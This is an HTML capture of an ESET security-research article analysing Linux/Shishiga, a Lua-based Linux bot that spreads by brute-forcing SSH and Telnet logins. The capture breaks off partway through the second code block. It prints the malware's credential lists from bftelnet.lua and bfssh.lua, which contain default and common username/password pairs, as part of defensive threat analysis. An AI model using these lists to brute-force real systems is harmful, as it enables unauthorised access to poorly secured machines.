<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Linux Shishiga malware using LUA scripts | WeLiveSecurity</title>
<meta name="description" content="The usage of the BitTorrent protocol and Lua modules separates Linux/Shishiga from other types of malware, according to analysis by ESET."/>
<link rel="canonical" href="https://www.welivesecurity.com/2017/04/25/linux-shishiga-malware-using-lua-scripts/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Linux Shishiga malware using LUA scripts | WeLiveSecurity" />
<meta property="og:description" content="The usage of the BitTorrent protocol and Lua modules separates Linux/Shishiga from other types of malware, according to analysis by ESET." />
<meta property="og:url" content="https://www.welivesecurity.com/2017/04/25/linux-shishiga-malware-using-lua-scripts/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2017-04-25T13:00:16+00:00" />
<meta property="article:modified_time" content="2019-05-16T09:11:13+00:00" />
<meta property="og:updated_time" content="2019-05-16T09:11:13+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/04/shutterstock_105272927.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2017/04/shutterstock_105272927.jpg" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="410" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="The usage of the BitTorrent protocol and Lua modules separates Linux/Shishiga from other types of malware, according to analysis by ESET." />
<meta name="twitter:title" content="Linux Shishiga malware using LUA scripts | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/04/shutterstock_105272927.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/2017/04/25/linux-shishiga-malware-using-lua-scripts/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2017/04/25/linux-shishiga-scripts-lua/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2017/04/25/linux-shishiga-malware-lua-skriptsprache/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/04/25/linux-shishiga-scripts-lua/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/04/25/linux-shishiga-malware-lua-skriptsprache/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/04/25/linux-shishiga-scripts-lua/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/04/25/linux-shishiga-malware-lua-skriptsprache/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Linux Shishiga malware using LUA scripts</h1>
<div class="excerpt">The usage of the BitTorrent protocol and Lua modules separates Linux/Shishiga from other types of malware, according to analysis by ESET.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/mmalik/" title="Michal Malik">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2016/03/Malik_Michal-222x179.jpg" alt="Michal Malik">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mmalik/" title="Michal Malik">
                    Michal Malik                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2017-04-25 15:00:16">25 Apr 2017 - 03:00PM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F04%2F25%2Flinux-shishiga-malware-using-lua-scripts%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F04%2F25%2Flinux-shishiga-malware-using-lua-scripts%2F&text=Linux Shishiga malware using LUA scripts%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F04%2F25%2Flinux-shishiga-malware-using-lua-scripts%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>The usage of the BitTorrent protocol and Lua modules separates Linux/Shishiga from other types of malware, according to analysis by ESET.</p>
                            </div>

                            <div id="preamble">
<div class="sectionbody">
<div class="paragraph">
<p>Among all the Linux samples that we receive every day, we noticed one sample detected only by Dr.Web &#8211; their detection name was Linux.LuaBot. We deemed this to be suspicious as our detection rates for the <a href="http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html" target="_blank" rel="noopener">Luabot</a> family have generally been high. Upon analysis, it turned out that this was, indeed, a bot written in <a href="https://www.lua.org" target="_blank" rel="noopener">Lua</a>, but it represents a new family, and is not related to previously seen Luabot malware. Thus, we’ve given it a new name: Linux/Shishiga. It uses 4 different protocols (SSH &#8211; Telnet &#8211; HTTP &#8211; BitTorrent) and Lua scripts for modularity.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_how_to_meet_shishiga">How to meet Shishiga?</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Linux/Shishiga targets GNU/Linux systems. Its infection vector is a very common one: bruteforcing weak credentials based on a password list. It does this in a similar fashion to <a href="http://www.welivesecurity.com/2016/11/02/linuxmoose-still-breathing/" target="_blank" rel="noopener">Linux/Moose</a> with the added capability to bruteforce SSH credentials too. Here is the complete credentials list at the time of writing:</p>
</div>
<div class="listingblock">
<div class="title"><strong><em>bftelnet.lua</em></strong></div>
</div>
</div>
</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282cc968690063" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
local accounts={
    {"admin","admin"},
    {"root","root"},
    {"adm","adm"},
    {"acer","acer"},
    {"user","user"},
    {"security","security"}
}
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282cc968690063-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282cc968690063-2">2</div><div class="crayon-num" data-line="crayon-60581b86282cc968690063-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282cc968690063-4">4</div><div class="crayon-num" data-line="crayon-60581b86282cc968690063-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282cc968690063-6">6</div><div class="crayon-num" data-line="crayon-60581b86282cc968690063-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282cc968690063-8">8</div><div class="crayon-num" data-line="crayon-60581b86282cc968690063-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282cc968690063-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282cc968690063-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282cc968690063-2"><span class="crayon-e">local </span><span class="crayon-v">accounts</span><span class="crayon-o">=</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b86282cc968690063-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"admin"</span><span class="crayon-sy">,</span><span class="crayon-s">"admin"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282cc968690063-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"root"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282cc968690063-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"adm"</span><span class="crayon-sy">,</span><span class="crayon-s">"adm"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282cc968690063-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"acer"</span><span class="crayon-sy">,</span><span class="crayon-s">"acer"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282cc968690063-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"user"</span><span class="crayon-sy">,</span><span class="crayon-s">"user"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282cc968690063-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"security"</span><span class="crayon-sy">,</span><span class="crayon-s">"security"</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b86282cc968690063-9"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282cc968690063-10"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->

</div>
<div class="sect1">
<div class="sectionbody">
<div class="listingblock">
<div class="title"><em><strong>bfssh.lua</strong></em></div>
</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282d2614802930" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
local accounts={
    {"admin","admin"},
    {"root","root"},
    {"adm","adm"},
    {"ubnt","ubnt"},
    {"root",""},
    {"admin",""},
    {"adm",""},
    {"user","user"},
    {"pi","pi"},
}

--[[
    {"acer","acer"},
    {"security","security"},
    {"root","toor"},
    {"root","roottoor"},
    {"root","password"},


    {"root","test"},
    {"root","abc123"},
    {"root","111111"},
    {"root","1q2w3e"},
    {"root","oracle"},
    {"root","1q2w3e4r"},
    {"root","123123"},
    {"root","qwe123"},
    {"root","p@ssw0rd"},

    {"root","1"},
    {"root","12"},
    {"root","123"},
    {"root","1234"},
    {"root","12346"},
    {"root","123467"},
    {"root","1234678"},
    {"root","12346789"},
    {"root","123467890"},
    {"root","qwerty"},
    {"root","pass"},
    {"root","toor"},
    {"root","roottoor"},
    {"root","password123"},
    {"root","password123456"},
    {"root","pass123"},
    {"root","password"},
    {"root","passw0rd"},
    {"root","1qaz"},
    {"root","1qaz2wsx"},
    {"root","asdfgh"},

    {"user","user"},
    {"user",""},
    {"acer","acer"},
    {"security","security"},
    {"root","passw0rds"},
]]
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282d2614802930-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-2">2</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-4">4</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-6">6</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-8">8</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-10">10</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-12">12</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-14">14</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-16">16</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-18">18</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-20">20</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-22">22</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-24">24</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-26">26</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-28">28</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-30">30</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-32">32</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-34">34</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-36">36</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-38">38</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-40">40</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-42">42</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-44">44</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-46">46</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-48">48</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-50">50</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-52">52</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-54">54</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-56">56</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d2614802930-58">58</div><div class="crayon-num" data-line="crayon-60581b86282d2614802930-59">59</div><div class="crayon-num crayon-striped-num" 